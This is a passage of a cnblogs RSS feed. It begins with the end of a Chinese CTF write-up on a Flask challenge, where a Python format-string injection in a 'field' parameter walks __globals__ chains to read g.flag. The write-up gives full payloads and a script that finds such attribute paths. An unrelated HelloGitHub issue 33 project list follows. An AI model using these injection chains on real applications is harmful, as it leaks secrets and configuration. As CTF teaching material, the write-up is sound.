    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; &lt;span&gt;not&lt;/span&gt; u &lt;span&gt;or&lt;/span&gt; u.balance &amp;lt; 1000000&lt;span&gt;:
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;{&quot;s&quot;: -1, &quot;msg&quot;: &quot;error&quot;}&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;
    field &lt;/span&gt;= request.form.get(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;field&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;username&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
    mhash &lt;/span&gt;= hashlib.sha256((&lt;span&gt;'&lt;/span&gt;&lt;span&gt;swpu++{0.&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; + field + &lt;span&gt;'&lt;/span&gt;&lt;span&gt;}&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;).encode(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;utf-8&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)).hexdigest()
    jdata &lt;/span&gt;= &lt;span&gt;'&lt;/span&gt;&lt;span&gt;{{&quot;{0}&quot;:&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; + &lt;span&gt;'&lt;/span&gt;&lt;span&gt;&quot;{1.&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; + field + &lt;span&gt;'&lt;/span&gt;&lt;span&gt;}&quot;, &quot;hash&quot;: &quot;{2}&quot;}}&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;
    &lt;span&gt;return&lt;/span&gt; jdata.format(field, g.u, mhash)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;其中getattr函数是获取当前对象的属性，也就是获取g对象的u这个属性，当登陆以后，u.balance&amp;gt;1000000以后就会调用request.form.get函数来获取field和username参数的值，为post方法。&lt;/p&gt;
&lt;p&gt;接下来就会进行format，format为&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;'&lt;/span&gt;&lt;span&gt;{{{field}:&lt;/span&gt;&lt;span&gt;{g.u.field&lt;/span&gt;&lt;span&gt;},hash: {mhash}}}&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;这里format有三个点，0，1，2，我们可以控制的点有1后面，有大佬测试了field，也就是跟在g.u之后，借用他的图，field=__class__，也就是g.u.__class__&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1063309/201812/1063309-20181223225414982-1337839241.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;显示为app.models.User,说明类的继承为user-&amp;gt;models-&amp;gt;app,所以应该先向上到models再到app，再读g.flag，出题人提示了方法，所以可以直接使用&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;__class__&lt;/span&gt;.save.&lt;span&gt;__globals__&lt;/span&gt;[db].&lt;span&gt;__class__&lt;/span&gt;.&lt;span&gt;__init__&lt;/span&gt;.&lt;span&gt;__globals__&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;当到了这一步的时候，已经可以获取到current_app这个类，它也就是flask的app了，因此到达这里就到达链条的顶端了，然后就向下找flag&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/1063309/201812/1063309-20181223231415701-306089485.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1063309/201812/1063309-20181223231607426-2006338241.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;可以看到app.before_request下面存在g，因此就可以通过current这个类来点用它来访问g.flag，完整的payload&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
field=&lt;span&gt;__class__&lt;/span&gt;.save.&lt;span&gt;__globals__&lt;/span&gt;[db].&lt;span&gt;__class__&lt;/span&gt;.&lt;span&gt;__init__&lt;/span&gt;.&lt;span&gt;__globals__&lt;/span&gt;[current_app].before_request.&lt;span&gt;__globals__&lt;/span&gt;[g].flag
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;因为flag在g这个全局的对象下面，所以我们才能这样访问，先找g，再在g这个空间中去找flag&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
save.&lt;span&gt;__globals__&lt;/span&gt;[db].&lt;span&gt;__init__&lt;/span&gt;.&lt;span&gt;__globals__&lt;/span&gt;[request].application.&lt;span&gt;__self__&lt;/span&gt;._get_data_for_json.&lt;span&gt;__globals__&lt;/span&gt;[current_app]._get_exc_class_and_code.&lt;span&gt;__globals__&lt;/span&gt;[find_package].&lt;span&gt;__globals__&lt;/span&gt;[_app_ctx_stack].top.g.flag
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;运用脚本寻找继承链：&lt;/p&gt;
&lt;p&gt; 这个脚本是从python的request这个对象开始找，我们模拟将flag放在g的空间下，那么脚本就会自动利用python中自带的类或对象去寻找g.flag&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;69&quot;&gt;
&lt;pre&gt;
&lt;span&gt;import&lt;/span&gt;&lt;span&gt; flask
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; os
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; flask &lt;span&gt;import&lt;/span&gt;&lt;span&gt; request
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; flask &lt;span&gt;import&lt;/span&gt;&lt;span&gt; g
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; flask &lt;span&gt;import&lt;/span&gt;&lt;span&gt; config

app &lt;/span&gt;= flask.Flask(&lt;span&gt;__name__&lt;/span&gt;&lt;span&gt;)

&lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; search(obj, max_depth):
    visited_clss &lt;/span&gt;=&lt;span&gt; []
    visited_objs &lt;/span&gt;=&lt;span&gt; []

    &lt;/span&gt;&lt;span&gt;def&lt;/span&gt; visit(obj, path=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;obj&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, depth=&lt;span&gt;0):
        &lt;/span&gt;&lt;span&gt;yield&lt;/span&gt;&lt;span&gt; path, obj

        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; depth ==&lt;span&gt; max_depth:
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;

        &lt;span&gt;elif&lt;/span&gt;&lt;span&gt; isinstance(obj, (int, float, bool, str, bytes)):
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;

        &lt;span&gt;elif&lt;/span&gt;&lt;span&gt; isinstance(obj, type):
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; obj &lt;span&gt;in&lt;/span&gt;&lt;span&gt; visited_clss:
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;
            visited_clss.append(obj)
            &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;&lt;span&gt;(obj)

        &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;:
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; obj &lt;span&gt;in&lt;/span&gt;&lt;span&gt; visited_objs:
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;
            visited_objs.append(obj)

        &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; attributes&lt;/span&gt;
        &lt;span&gt;for&lt;/span&gt; name &lt;span&gt;in&lt;/span&gt;&lt;span&gt; dir(obj):
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; name.startswith(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;) &lt;span&gt;and&lt;/span&gt; name.endswith(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;):
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; name &lt;span&gt;not&lt;/span&gt; &lt;span&gt;in&lt;/span&gt; (&lt;span&gt;'&lt;/span&gt;&lt;span&gt;__globals__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;__class__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;__self__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;,
                                &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;__weakref__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;__objclass__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;__module__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;):
                    &lt;/span&gt;&lt;span&gt;continue&lt;/span&gt;&lt;span&gt;
            attr &lt;/span&gt;=&lt;span&gt; getattr(obj, name)
            &lt;/span&gt;&lt;span&gt;yield&lt;/span&gt; &lt;span&gt;from&lt;/span&gt; visit(attr, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;{}.{}&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;.format(path, name), depth + 1&lt;span&gt;)

        &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; dict values&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt; hasattr(obj, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;items&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;) &lt;span&gt;and&lt;/span&gt;&lt;span&gt; callable(obj.items):
            &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt;:
                &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; k, v &lt;span&gt;in&lt;/span&gt;&lt;span&gt; obj.items():
                    &lt;/span&gt;&lt;span&gt;yield&lt;/span&gt; &lt;span&gt;from&lt;/span&gt; visit(v, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;{}[{}]&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;.format(path, repr(k)), depth)
            &lt;/span&gt;&lt;span&gt;except&lt;/span&gt;&lt;span&gt;:
                &lt;/span&gt;&lt;span&gt;pass&lt;/span&gt;

        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; items&lt;/span&gt;
        &lt;span&gt;elif&lt;/span&gt;&lt;span&gt; isinstance(obj, (set, list, tuple, frozenset)):
            &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; i, v &lt;span&gt;in&lt;/span&gt;&lt;span&gt; enumerate(obj):
                &lt;/span&gt;&lt;span&gt;yield&lt;/span&gt; &lt;span&gt;from&lt;/span&gt; visit(v, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;{}[{}]&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;.format(path, repr(i)), depth)

    &lt;/span&gt;&lt;span&gt;yield&lt;/span&gt; &lt;span&gt;from&lt;/span&gt;&lt;span&gt; visit(obj)

@app.route(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; index():
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; open(&lt;span&gt;__file__&lt;/span&gt;&lt;span&gt;).read()

@app.route(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;/shrine/&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; shrine():
    g.flag &lt;/span&gt;= &lt;span&gt;'&lt;/span&gt;&lt;span&gt;flag{}&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;
    &lt;span&gt;for&lt;/span&gt; path, obj &lt;span&gt;in&lt;/span&gt; search(request, 10&lt;span&gt;):
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; obj ==&lt;span&gt; g.flag:
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; path

&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; &lt;span&gt;__name__&lt;/span&gt; == &lt;span&gt;'&lt;/span&gt;&lt;span&gt;__main__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;:
    app.run(debug&lt;/span&gt;=True)
&lt;/pre&gt;&lt;/div&gt;

&lt;p align=&quot;left&quot;&gt; &lt;/p&gt;

</description>
<pubDate>Thu, 27 Dec 2018 15:11:00 +0000</pubDate>
<dc:creator>tr1ple</dc:creator>
<og:description>1.用优惠码 买个 X ? （1）第一步： 这道题第一步主要知道利用php的随机种子数泄露以后就可以利用该种子数来预测序列，而在题目中会返回15位的优惠码，但是必须要24位的优惠码，因此要根据15位的</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/wfzWebSecuity/p/10159489.html</dc:identifier>
</item>
<item>
<title>《HelloGitHub》第 33 期 - 削微寒</title>
<link>http://www.cnblogs.com/xueweihan/p/10188005.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/xueweihan/p/10188005.html</guid>
<description>&lt;p&gt;欢迎 &lt;a href=&quot;https://github.com/521xueweihan/HelloGitHub/issues/new&quot;&gt;点击分享&lt;/a&gt; 自荐或发现的开源项目，也可安装 &lt;a href=&quot;https://awesome.fairyever.com/article/chrome-extension.html&quot;&gt;分享插件&lt;/a&gt; 更便捷地推荐有趣的开源项目。&lt;/p&gt;
&lt;p&gt;小伙伴们，新的一年就要来了，今年的 Bug 改完了吗？先看看《HelloGitHub》最新一期月刊压压惊，再改吧😁&lt;/p&gt;

&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;兴趣是最好的老师，&lt;strong&gt;HelloGitHub&lt;/strong&gt; 就是帮你找到兴趣！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/521xueweihan/img/master/hellogithub/01/img/hello-github.jpg&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;简介&quot;&gt;简介&lt;/h2&gt;
&lt;p&gt;分享 GitHub 上有趣、入门级的开源项目。&lt;/p&gt;
&lt;p&gt;这是一个面向&lt;strong&gt;编程新手&lt;/strong&gt;、&lt;strong&gt;热爱编程&lt;/strong&gt;、&lt;strong&gt;对开源社区感兴趣&lt;/strong&gt; 人群的月刊，月刊的内容包括：&lt;strong&gt;各种编程语言的项目&lt;/strong&gt;、&lt;strong&gt;让生活变得更美好的工具&lt;/strong&gt;、&lt;strong&gt;书籍、学习笔记、教程等&lt;/strong&gt;，这些开源项目大多都是非常容易上手，而且非常 Cool。主要是希望大家能动手用起来，加入到&lt;strong&gt;开源社区&lt;/strong&gt;中。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;会编程的可以贡献代码&lt;/li&gt;
&lt;li&gt;不会编程的可以反馈使用这些工具中的 Bug&lt;/li&gt;
&lt;li&gt;帮着宣传你觉得优秀的项目&lt;/li&gt;
&lt;li&gt;Star 项目⭐️&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;在浏览、参与这些项目的过程中，你将学习到&lt;strong&gt;更多编程知识&lt;/strong&gt;、&lt;strong&gt;提高编程技巧&lt;/strong&gt;、&lt;strong&gt;找到编程的乐趣&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;🎉 最后 &lt;a href=&quot;https://hellogithub.com/&quot;&gt;HelloGitHub&lt;/a&gt; 这个项目就诞生了 🎉&lt;/p&gt;
&lt;hr/&gt;&lt;blockquote readability=&quot;3.5882352941176&quot;&gt;
&lt;p&gt;&lt;strong&gt;以下为本期内容&lt;/strong&gt;｜每个月 &lt;strong&gt;28&lt;/strong&gt; 号发布最新一期｜&lt;a href=&quot;https://github.com/521xueweihan/HelloGitHub#%E5%86%85%E5%AE%B9&quot;&gt;点击查看往期内容&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&quot;c-项目&quot;&gt;C 项目&lt;/h4&gt;
&lt;p&gt;1、&lt;a href=&quot;https://github.com/miloyip/json-tutorial&quot;&gt;json-tutorial&lt;/a&gt;：由&lt;a href=&quot;https://github.com/miloyip/json-tutorial#%E5%85%B3%E4%BA%8E%E4%BD%9C%E8%80%85&quot;&gt;Milo Yip&lt;/a&gt;发起的用 C 从零开始编写 JSON 库教程。大纲：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;启程：编译环境、JSON 简介、测试驱动、解析器主要函数及各数据结构。&lt;/li&gt;
&lt;li&gt;解析数字：JSON number 的语法&lt;/li&gt;
&lt;li&gt;解析字符串：使用 union 存储 variant、自动扩展的堆栈、JSON string 的语法、valgrind&lt;/li&gt;
&lt;li&gt;Unicode：Unicode 和 UTF-8 的基本知识、JSON string 的 unicode 处理&lt;/li&gt;
&lt;li&gt;解析数组：JSON array 的语法&lt;/li&gt;
&lt;li&gt;解析对象：JSON object 的语法、重构 string 解析函数&lt;/li&gt;
&lt;li&gt;生成器：JSON 生成过程、注意事项。练习完成 JSON 生成器&lt;/li&gt;
&lt;li&gt;访问与其他功能：JSON array／object 的访问及修改&lt;/li&gt;
&lt;/ol&gt;&lt;h4 id=&quot;c-项目-1&quot;&gt;C++ 项目&lt;/h4&gt;
&lt;p&gt;2、&lt;a href=&quot;https://github.com/MisterBooo/LeetCodeAnimation&quot;&gt;LeetCodeAnimation&lt;/a&gt;：用动画的形式呈现解 LeetCode 题目的思路&lt;/p&gt;
&lt;h4 id=&quot;css-项目&quot;&gt;CSS 项目&lt;/h4&gt;
&lt;p&gt;3、&lt;a href=&quot;https://github.com/ajusa/lit&quot;&gt;lit&lt;/a&gt;：仅 395 字节的响应式 CSS 框架&lt;/p&gt;
&lt;h4 id=&quot;go-项目&quot;&gt;Go 项目&lt;/h4&gt;
&lt;p&gt;4、&lt;a href=&quot;https://github.com/sgreben/yeetgif&quot;&gt;yeetgif&lt;/a&gt;：一个命令行工具，用来组合、生成表情的 gif 动图。支持多种模式：旋转、抖动、鬼畜等，可以组合出很魔性的表情&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/521xueweihan/img/master/hellogithub/33/img/yeetgif.gif&quot;/&gt;&lt;/p&gt;
&lt;p&gt;5、&lt;a href=&quot;https://github.com/Larry850806/ptt-daily-beauty&quot;&gt;ptt-daily-beauty&lt;/a&gt;：每晚 11 点会自动发送 PTT 论坛（台湾最大论坛） Beauty 板块前 3 名的小姐姐图片。&lt;a href=&quot;https://www.daily-beauty.xyz/&quot;&gt;点击订阅&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/521xueweihan/img/master/hellogithub/33/img/ptt-daily-beauty.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;6、&lt;a href=&quot;https://github.com/y0ssar1an/q&quot;&gt;q&lt;/a&gt;：Golang debug 库，自动打印变量类型并且格式化输出&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/521xueweihan/img/master/hellogithub/33/img/q.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;7、&lt;a href=&quot;https://github.com/isacikgoz/tldr&quot;&gt;tldr&lt;/a&gt;：Golang tldr 客户端。对比之前推荐过的 Python 版本客户端，Golang 版本速度更快、交互友好、且支持选择搜索结果的展示样式。每当你想要用 tar 解压缩，但是记不住具体参数的时候，tldr 可以拯救世界&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/521xueweihan/img/master/hellogithub/33/img/tldr.gif&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;java-项目&quot;&gt;Java 项目&lt;/h4&gt;
&lt;p&gt;8、&lt;a href=&quot;https://github.com/elvishew/xLog&quot;&gt;xLog&lt;/a&gt;：简单、美观、强大、可扩展的 Android 和 Java 日志库，可同时在多个通道打印日志，如 Logcat、Console 和文件。功能：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;全局配置（TAG，各种格式化器...）或基于单条日志的配置&lt;/li&gt;
&lt;li&gt;支持打印任意对象以及可自定义的对象格式化器&lt;/li&gt;
&lt;li&gt;支持打印无限长的日志（没有 4K 字符的限制）&lt;/li&gt;
&lt;li&gt;XML 和 JSON 格式化输出&lt;/li&gt;
&lt;li&gt;等等&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/521xueweihan/img/master/hellogithub/33/img/xLog.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;9、&lt;a href=&quot;https://github.com/huangyz0918/AndroidWM&quot;&gt;AndroidWM&lt;/a&gt;：一个轻量级的开源 Android 图片水印框架，支持文字水印和图像水印，以及不同的水印样式、位置等。同时可以支持 LSB 空间域隐形数字水印的加载和频域数字水印的加载和检测，适合客户端图片水印添加，移动端图像处理等&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/521xueweihan/img/master/hellogithub/33/img/AndroidWM.png&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;javascript-项目&quot;&gt;JavaScript 项目&lt;/h4&gt;
&lt;p&gt;10、&lt;a href=&quot;https://github.com/cnwangjie/better-onetab&quot;&gt;better-onetab&lt;/a&gt;：实用的管理浏览器多标签页面的工具，目前支持 Chrome 以及 FireFox 的扩展。支持标签页储存和标签页分组等功能&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/521xueweihan/img/master/hellogithub/33/img/better-onetab.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;11、&lt;a href=&quot;https://github.com/hustcc/lint-md&quot;&gt;lint-md&lt;/a&gt;：用于检查中文 markdown 编写格式规范的命令行工具。方便集成 CI，支持 API 方法调用。对于矫正 markdown 编写格式来说是一个很好的检查工具，基于 AST 的格式规范检测的代码也可以借鉴和学习&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/521xueweihan/img/master/hellogithub/33/img/lint-md.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;12、&lt;a href=&quot;https://github.com/xinyu198736/js2image&quot;&gt;js2image&lt;/a&gt;：将源代码压缩成圣诞树的样子，使用此项目压缩生产环境代码后请注意测试。有兴趣的小伙伴可以尝试扩展出压缩成其它样子，很有意思&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/521xueweihan/img/master/hellogithub/33/img/js2image.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;13、&lt;a href=&quot;https://github.com/swc-project/swc&quot;&gt;swc&lt;/a&gt;：基于 Rust 开发的 &lt;a href=&quot;https://github.com/babel/babel&quot;&gt;Babel&lt;/a&gt; 替代品，速度更快，值得关注&lt;/p&gt;
&lt;h4 id=&quot;objective-c-项目&quot;&gt;Objective-C 项目&lt;/h4&gt;
&lt;p&gt;14、&lt;a href=&quot;https://github.com/tbodt/ish&quot;&gt;iSH&lt;/a&gt;：在 iOS 上跑 Linux shell，可以通过 linux 命令操作你的 iOS 设备&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/521xueweihan/img/master/hellogithub/33/img/ish.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;15、&lt;a href=&quot;https://github.com/hon-key/Nudeln&quot;&gt;Nudeln&lt;/a&gt;：基于 UITextView 书写风格类似于 masonry 的 iOS 端富文本控件。它采用声明式（链式）方法定义富文本控件，与编程式的相比它所需的代码量更短、更直观和易用。示例代码：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;#import &quot;NudeIn.h&quot;

/// 声明控件为你的成员变量

@property (nonatomic,strong) NudeIn *attrLabel;

/// Do it yourself

_attrLabel = [NudeIn make:^(NUDTextMaker *make) {
    make.text(@&quot;this is a &quot;).font(14).color([UIColor blackColor]).attach();
    make.text(@&quot;BlueLink&quot;).font(17).color([UIColor blueColor]).link(self,@selector(linkHandler:)).attach();
    make.text(@&quot;, and this is a &quot;).font(14).color([UIColor blackColor]).attach();
    make.text(@&quot;RedLink&quot;).font(17).color([UIColor redColor]).link(self,@selector(linkHandler:)).attach();
}];

/// 对声明了 link 属性的部分定义回调
 (void)linkHandler:(NUDAction *)action {
    
    if ([action isKindOfClass:[NUDLinkAction class]]) {
        
        NUDLinkAction *linkAction = (NUDLinkAction *)action;
        
        UIAlertController *alertController = [UIAlertController alertControllerWithTitle:linkAction.string message:nil preferredStyle:UIAlertControllerStyleAlert];
    
        [alertController addAction:[UIAlertAction actionWithTitle:@&quot;OK&quot; style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) {
        }]];
        
        [self presentViewController:alertController animated:YES completion:nil];
        
    }
    
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;16、&lt;a href=&quot;https://github.com/pujiaxin33/JXCategoryView&quot;&gt;JXCategoryView&lt;/a&gt;：几乎实现了当前所有主流 APP 的分类切换控制效果的库。效果丰富、配置简单，优点：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;使用协议封装指示器逻辑，可以为所欲为的自定义指示器效果&lt;/li&gt;
&lt;li&gt;提供更加全面丰富、高度自定义的效果&lt;/li&gt;
&lt;li&gt;使用子类化管理 cell 样式，逻辑更清晰，扩展更简单&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/521xueweihan/img/master/hellogithub/33/img/JXCategoryView.gif&quot;/&gt;&lt;/p&gt;
&lt;p&gt;17、&lt;a href=&quot;https://github.com/Quotation/LongestCocoa&quot;&gt;LongestCocoa&lt;/a&gt;：写 Objective-C 的程序员肯定对冗长的描述性命名风格爱的深切。所以 Cocoa 框架里最长的方法或在常量名有哪些？该项目就是告诉你这些冗长名字都有那些&lt;/p&gt;
&lt;h4 id=&quot;php-项目&quot;&gt;PHP 项目&lt;/h4&gt;
&lt;p&gt;18、&lt;a href=&quot;https://github.com/Qsnh/meedu&quot;&gt;MeEdu&lt;/a&gt;：开源免费的在线教育系统，支持在线点播、在线电子书、会员收费三大模块。&lt;a href=&quot;https://meedu.app/&quot;&gt;在线尝试&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;python-项目&quot;&gt;Python 项目&lt;/h4&gt;
&lt;p&gt;19、&lt;a href=&quot;https://github.com/Delgan/loguru&quot;&gt;loguru&lt;/a&gt;：一个让 Python 记录日志变得简单的库&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/521xueweihan/img/master/hellogithub/33/img/loguru.gif&quot;/&gt;&lt;/p&gt;
&lt;p&gt;20、&lt;a href=&quot;https://github.com/rspivak/lsbasi&quot;&gt;lsbasi&lt;/a&gt;：用 Python 写一个简单的解释器系列教程&lt;/p&gt;
&lt;p&gt;21、&lt;a href=&quot;https://github.com/mkdocs/mkdocs&quot;&gt;mkdocs&lt;/a&gt;：用 Python 开发的快速、简单的静态网站生成器，主要是为了构建项目的文档。文档源是 markdown 文件，用法和 Hexo 差不多，可通过一个 YAML 文件进行配置&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/521xueweihan/img/master/hellogithub/33/img/mkdocs.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;22、&lt;a href=&quot;https://github.com/wonderfulsuccess/weixin_crawler&quot;&gt;weixin_crawler&lt;/a&gt;：基于 Scrapy、Flask、Echarts、Elasticsearch 等实现的微信公众号文章爬虫。自带 UI 界面、分析报告、搜索功能&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/521xueweihan/img/master/hellogithub/33/img/weixin_crawler.gif&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;其它&quot;&gt;其它&lt;/h4&gt;
&lt;p&gt;23、&lt;a href=&quot;https://github.com/arialdomartini/Back-End-Developer-Interview-Questions&quot;&gt;Back-End-Developer-Interview-Questions&lt;/a&gt;：《后端开发面试题》&lt;a href=&quot;https://github.com/monklof/Back-End-Developer-Interview-Questions&quot;&gt;中文&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;24、&lt;a href=&quot;https://github.com/ruanyf/weekly&quot;&gt;weekly&lt;/a&gt;：&lt;a href=&quot;https://github.com/ruanyf&quot;&gt;阮一峰&lt;/a&gt;技术分享周刊，每周五发布&lt;/p&gt;
&lt;p&gt;25、&lt;a href=&quot;https://github.com/unbug/codelf&quot;&gt;codelf&lt;/a&gt;：变量命名工具。计算机科学里两件最难的事：缓存失效和命名。该工具支持直接搜索中文，当你查中文的时候，Codelf 会直接查好单词和单词的近义词给你。然后再搜索 Github、Bitbucket、Google Code 等上的开源项目的源码匹配出与这些词汇相关的变量名和函数名。&lt;a href=&quot;https://unbug.github.io/codelf/&quot;&gt;在线尝试&lt;/a&gt;&lt;/p&gt;
